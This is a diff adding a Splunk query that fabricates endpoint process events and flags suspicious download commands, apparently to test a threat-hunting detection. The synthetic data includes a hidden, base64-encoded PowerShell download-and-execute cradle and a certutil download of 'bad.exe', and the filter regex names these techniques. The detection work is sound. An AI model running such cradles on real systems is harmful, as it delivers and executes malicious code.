@@ -1,0 +1,18 @@
+| makeresults count=220
+| streamstats count as n
+| eval base=relative_time(now(),"@d")
+| eval user=case(n<=120,"alice", n<=190,"adminsvc", true(),"jdoe")
+| eval host=case(user="jdoe","ENG-LAPTOP-2", user="adminsvc","IT-JUMPBOX-1", true(),"OPS-PC-3")
+| eval _time=case(user="jdoe", base + 23*3600 + (n%1800), true(), base + 11*3600 + (n%1800))
+| eval Image=case(n%4=0,"powershell.exe", n%4=1,"cmd.exe", n%4=2,"certutil.exe", true(),"powershell.exe")
+| eval CommandLine=case(
+    user="adminsvc" AND Image="powershell.exe","powershell.exe -Command Invoke-WebRequest https://microsoft.com/script.ps1 -OutFile C:\\temp\\ok.ps1",
+    user="adminsvc" AND Image="certutil.exe","certutil.exe -urlcache -f https://download.microsoft.com/file.txt C:\\temp\\file.txt",
+    user="jdoe" AND Image="powershell.exe","powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcABzADoALwAvAGQAcgBvAHAAcABvAHgALgBjAG8AbQAvAGIAYQBkACcAKQA=",
+    user="jdoe" AND Image="certutil.exe","certutil.exe -urlcache -f https://dropbox.com/bad.exe C:\\Users\\Public\\bad.exe",
+    true(),"powershell.exe -Command Invoke-WebRequest https://example.com/test.txt -OutFile C:\\temp\\test.txt"
+  )
+| eval is_susp=if(match(lower(CommandLine),"invoke-webrequest|iwr|downloadstring|frombase64string|\\-enc |certutil\\.exe\\s+\\-urlcache"),1,0)
+| where is_susp=1
+| table _time user host Image CommandLine
+| sort -_time
